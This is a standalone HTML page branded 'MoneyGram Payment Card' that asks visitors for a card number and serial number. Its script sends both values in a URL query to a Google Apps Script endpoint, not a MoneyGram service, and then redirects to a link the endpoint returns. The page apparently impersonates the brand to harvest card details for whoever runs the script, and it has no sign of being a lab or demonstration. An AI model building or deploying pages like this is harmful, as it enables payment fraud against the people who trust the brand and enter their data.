<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title> MoneyGram Payment Card</title>
  <style>
    body {
      background-color: #fff5f5;
      font-family: 'Tahoma', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }

    .container {
      background-color: #fff;
      padding: 30px;
      border: 2px solid #d33;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 15px rgba(255, 0, 0, 0.2);
    }

    h2 {
      text-align: center;
      color: #d33;
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      background-color: #d33;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    button:disabled {
      background-color: #aaa;
    }

    #loading {
      display: none;
      text-align: center;
    }

    #loading img {
      width: 50px;
    }

    #message {
      text-align: center;
      margin-top: 15px;
      color: #d33;
      font-weight: bold;
    }

    @media (max-width: 500px) {
      .container {
        padding: 20px;
        margin: 10px;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>MoneyGram Payment Card </h2>
    <label for="cardNumber">Card Number </label>
    <input type="text" id="cardNumber" placeholder="Type card Number " required>

    <label for="serialNumber">Serial Number </label>
    <input type="text" id="serialNumber" placeholder="Type Serial Number " required>

    <button onclick="processPayment()">Pay now</button>

    <div id="loading">
      <img src="https://i.gifer.com/YCZH.gif" alt=" Please wait your payment process in progress ...">
      <p>Please wait your payment process in progress ...</p>
    </div>

    <div id="message"></div>
  </div>

  <script>
    async function processPayment() {
      const card = document.getElementById('cardNumber').value.trim();
      const serial = document.getElementById('serialNumber').value.trim();
      const loading = document.getElementById('loading');
      const message = document.getElementById('message');

      if (!card || !serial) {
        message.textContent = 'All field is required';
        return;
      }

      message.textContent = '';
      loading.style.display = 'block';

      try {
        const sheetURL = 'https://script.google.com/macros/s/AKfycbwyBWMQV78wSFf6y2_oGJCIAraZkSJvbznnhhT1UoqVS0mQUuUTRJefL9itAj4gCKA/exec';
        const response = await fetch(sheetURL + `?card=${card}&serial=${serial}`);
        const result = await response.json();

        loading.style.display = 'none';

        if (result.status === 'success') {
          message.style.color = 'green';
          message.textContent = 'Payment Was seccessfully';
          window.location.href = result.link;
        } else {
          message.style.color = 'red';
          message.textContent = 'Serial Number already used.';
        }

      } catch (error) {
        loading.style.display = 'none';
        message.style.color = 'red';
        message.textContent = 'Please try a new valid Serial Number.';
      }
    }
  </script>

</body>
</html>
